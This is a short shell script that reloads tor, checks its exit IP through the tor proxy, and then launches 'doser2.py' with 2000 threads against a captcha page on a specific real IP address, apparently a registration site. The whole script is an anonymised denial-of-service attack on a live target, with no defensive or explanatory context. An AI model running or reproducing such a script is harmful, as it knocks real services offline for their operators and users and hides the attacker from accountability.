#!/bin/sh
service tor reload &>/dev/null
curl --socks5 127.0.0.1:9050 ip.p3terx.com
python3 doser2.py -g 'http://167.172.229.66/proceso-inscripcion/capcha.php' -t 2000
